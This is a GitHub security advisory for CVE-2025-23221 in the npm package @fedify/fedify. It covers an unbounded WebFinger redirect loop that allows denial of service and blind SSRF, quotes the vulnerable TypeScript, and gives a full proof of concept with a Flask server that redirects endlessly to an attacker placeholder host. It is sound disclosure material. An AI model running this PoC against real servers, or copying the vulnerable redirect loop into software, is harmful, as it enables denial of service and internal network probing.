# [M] Infinite loop and Blind SSRF found inside the Webfinger mechanism in @fedify/fedify

## Summary
Severity: Medium
Advisory: GHSA-c59p-wq67-24wx
CVE: CVE-2025-23221
CWE: CWE-835, CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:N/A:L (CVSS_V3)
Published: 2025-01-21
Source: https://github.com/advisories/GHSA-c59p-wq67-24wx
Type: github-advisory

## Affected
- npm: `@fedify/fedify` — affected >=1.0.13 <1.0.14
- npm: `@fedify/fedify` — affected >=1.1.10 <1.1.11
- npm: `@fedify/fedify` — affected >=1.2.10 <1.2.11
- npm: `@fedify/fedify` — affected >=1.3.3 <1.3.4

## Details
### Summary
This vulnerability allows a user to maneuver the Webfinger mechanism to perform a GET request to any internal resource on any Host, Port, URL combination regardless of present security mechanisms, and forcing the victim’s server into an infinite loop causing Denial of Service.
Moreover, this issue can also be maneuvered into performing a Blind SSRF attack.

### Details
The Webfinger endpoint takes a remote domain for checking accounts as a feature, however, as per the ActivityPub spec (https://www.w3.org/TR/activitypub/#security-considerations), on the security considerations section at B.3, access to Localhost services should be prevented while running in production.

The **lookupWebFinger** function, responsible for returning an actor handler for received actor objects from a remote server, can be abused to perform a Denial of Service (DoS) and Blind SSRF attacks while attempting to resolve a malicious actor’s object.
On Fedify, two client-facing functions implement the **lookupWebFinger** function- **getActorHandle**, and **lookupObject**, which are both used as a wrapper for the vulnerable lookup function.
As the **lookupObject** function is implemented only for CLI usage, we won’t focus our PoC and explanation on it, but it is still vulnerable in the same way **getActorHandle** is.

The **getActorHandle** function is a wrapper function for the **getActorHandleInternal** function (both present at _/src/vocab/actor.ts_):
```javascript
async function getActorHandleInternal(
  actor: Actor | URL,
  options: GetActorHandleOptions = {},
): Promise<`@${string}@${string}` | `${string}@${string}`> {
  const actorId = actor instanceof URL ? actor : actor.id;
  if (actorId != null) {
    const result = await lookupWebFinger(actorId, {
      userAgent: options.userAgent,
      tracerProvider: options.tracerProvider,
    });
    if (result != null) {
      const aliases = [...(result.aliases ?? [])];
      if (result.subject != null) aliases.unshift(result.subject);
      for (const alias of aliases) {
        const match = alias.match(/^acct:([^@]+)@([^@]+)$/);
        if (match != null) {
          const hostname = new URL(`https://${match[2]}/`).hostname;
          if (
            hostname !== actorId.hostname &&
            !await verifyCrossOriginActorHandle(
              actorId.href,
              alias,
              options.userAgent,
              options.tracerProvider,
            )
          ) {
            continue;
          }
          return normalizeActorHandle(`@${match[1]}@${match[2]}`, options);
        }
      }
    }
  }
  if (
    !(actor instanceof URL) && actor.preferredUsername != null &&
    actor.id != null
  ) {
    return normalizeActorHandle(
      `@${actor.preferredUsername}@${actor.id.host}`,
      options,
    );
  }
  throw new TypeError(
    "Actor does not have enough information to get the handle.",
  );
}
```

The **actorId** parameter containing a URL of the actor ID sinks into the **lookupWebFinger** function which is a wrapper for the **lookupWebFingerInternal**:
```javascript
async function lookupWebFingerInternal(
  resource: URL | string,
  options: LookupWebFingerOptions = {},
): Promise<ResourceDescriptor | null> {
  if (typeof resource === "string") resource = new URL(resource);
  let protocol = "https:";
  let server: string;
  if (resource.protocol === "acct:") {
    const atPos = resource.pathname.lastIndexOf("@");
    if (atPos < 0) return null;
    server = resource.pathname.substring(atPos + 1);
    if (server === "") return null;
  } else {
    protocol = resource.protocol;
    server = resource.host;
  }
  let url = new URL(`${protocol}//${server}/.well-known/webfinger`);
  url.searchParams.set("resource", resource.href);
  while (true) {
    logger.debug(
      "Fetching WebFinger resource descriptor from {url}...",
      { url: url.href },
    );
    let response: Response;
    try {
      response = await fetch(url, {
        headers: {
          Accept: "application/jrd+json",
          "User-Agent": typeof options.userAgent === "string"
            ? options.userAgent
            : getUserAgent(options.userAgent),
        },
        redirect: "manual",
      });
    } catch (error) {
      logger.debug(
        "Failed to fetch WebFinger resource descriptor: {error}",
        { url: url.href, error },
      );
      return null;
    }
    if (
      response.status >= 300 && response.status < 400 &&
      response.headers.has("Location")
    ) {
      url = new URL(
        response.headers.get("Location")!,
        response.url == null || response.url === "" ? url : response.url,
      );
      continue;
    }
    if (!response.ok) {
      logger.debug(
        "Failed to fetch WebFinger resource descriptor: {status} {statusText}.",
        {
          url: url.href,
          status: response.status,
          statusText: response.statusText,
        },
      );
      return null;
    }
    try {
      return await response.json() as ResourceDescriptor;
    } catch (e) {
      if (e instanceof SyntaxError) {
        logger.debug(
          "Failed to parse WebFinger resource descriptor as JSON: {error}",
          { error: e },
        );
        return null;
      }
      throw e;
    }
  }
}
```

The function takes the **actorId** parameter containing the actor ID URL, extracts the scheme and uses the rest of the URL (host+port+path) directly inside a hard-coded Webfinger URL address which in turn sinks into a fetch request.

On the fetch request, the **redirect** attribute is set to “**manual**” preventing automated redirects. However, redirects are still handled using custom code that loops over responses and re-fetching the URL found inside the “Location” header until receiving a valid response or an error occurs (loop keeps until 300>status code>400).

This custom redirect implementation contains multiple issues:
1.The redirect loop is endless ( while(true) loop ) without any iteration limiting, allowing attackers to perform DoS via endless redirecting.
2. A Blind SSRF attack to any URL, with arbitrary Host, Port and Path is possible via the current custom redirect implementation.
3. As the redirect handler is a custom one, it breaches the security mechanisms presented by the native redirect handler of fetch - allowing the attacker to redirect to different schemes such as data or file schemes.

In order to successfully perform any of the attacks described above, an attacker needs to create a federated app which presents a malicious actor object, containing an actor ID URL of a second server which performs a recursive redirect to itself, or a URL containing an internal resource.


### PoC
1. In order to show a use case of the vulnerability, we can use the demo app presented at this URL: https://github.com/dahlia/microblog.
2. We will create two machines, victim and attacker, each one on a different server with different domains.

**_Victim Machine_**
1. Create a new instance (we tested on ubuntu’s latest version), and update the package manager.
2. Install a Deno server:
`
curl -fsSL https://deno.land/install.sh | sh
`
`
source ~/.bashrc
`
`
deno --version #check deno is working
`
3. Pull the git repository of the victim blog app:
`
git clone https://github.com/dahlia/fedify.git
`
4. Modify the federation object to remove signature checks for the sake of easy testing:
On file **_/examples/blog/federation/mod.ts_** edit the **_createFederation<void>_** object the following attribute: **_skipSignatureVerification: true_**.
5. Change into the blog app directory ( /examples/blog ) and run the app:
`
deno task preview
`
6. Surf to the application on the browser, and register a user on the app.

**_Attacker Machine_**
1. Create a new instance (we tested on ubuntu’s latest version), and update the package manager.
2. Install NVM in order to install the latest version of NPM and NODEJS (and source current shell to check it worked):
`
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash
`
`
source ~/.bashrc
`
`
nvm list-remote
`
3. Install the latest stable version:
`
nvm install {latest_ver} #for example: v20.10.0
`
`
source ~/.bashrc
`
`
npm -v #check it works
`
`
node -v #check it works
`
4. Download the attacker app repository:
`
git clone https://github.com/dahlia/microblog.git
`
5. Disable request signature validations:
Edit the **_/src/federation.ts_** file and add a **_skipSignatureVerification: true_** attribute to the **_createFederation_** object.
6. Modify the **_/src/federation.ts_** file and tamper with the Person object on the actor dispatcher ( **_setActorDispatcher("/users/{identifier}"_** ) - change the actor ID attribute **_“id: ctx.getActorUri(identifier)_**” into “**_id: new URL(‘http://<ATTACKER_MACHINE_DOMAIN>:1337/users/enterloop’)_**”.
7. Install python flask and create the Python Flask redirect server:
`
apt update
`
`
apt install python3-flask
`
```python
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/health')
def health():
    return "hello", 200

@app.route('/.well-known/webfinger')
def ssrfinger():
    return redirect("http://<ATTACKER_MACHINE_DOMAIN>:1337/endlessloop")

@app.route('/endlessloop')
def endlessloop():
    return redirect("http://<ATTACKER_MACHINE_DOMAIN>:1337/endlessloop")

if __name__ == '__main__':
    app.run(debug=True,host='0.0.0.0' ,port=1337)
```
8.  Run the python server and attempt to reach the “**_/health_**” path to see the server functions as expected.
9. Read the **_README.txt_** file on the attacker app and follow the instructions on how to execute the app.
10. Surf the app on the browser and attempt to follow the federated user on the victim’s machine.
11. Send the “follow” request and watch the victim app continue to query the redirect server infinitely (It is possible to repeat this step multiple times causing multiple loops).


### Impact
1. Implement a limiting stop condition for the endless loop to prevent infinite loops.
2. Validate the scheme while performing a manual redirection handler.
3. For each web resource (for the **_lookupWebFinger_** function and also URLs found on the “**_Location_**” header inside the loop) use the “**_validatePublicUrl_**” function to verify that it is not targeting a local resource.

## References
- https://github.com/dahlia/fedify/security/advisories/GHSA-c59p-wq67-24wx
- https://nvd.nist.gov/vuln/detail/CVE-2025-23221
- https://github.com/dahlia/fedify/commit/8be3c2038eebf4ae12481683a1e809b314be3151
- https://github.com/dahlia/fedify/commit/c505eb82fcd6b5b17174c6659c29721bc801ab9a
- https://github.com/dahlia/fedify/commit/e921134dd5097586e4563ea80b9e8d1b5460a645
- https://github.com/dahlia/fedify
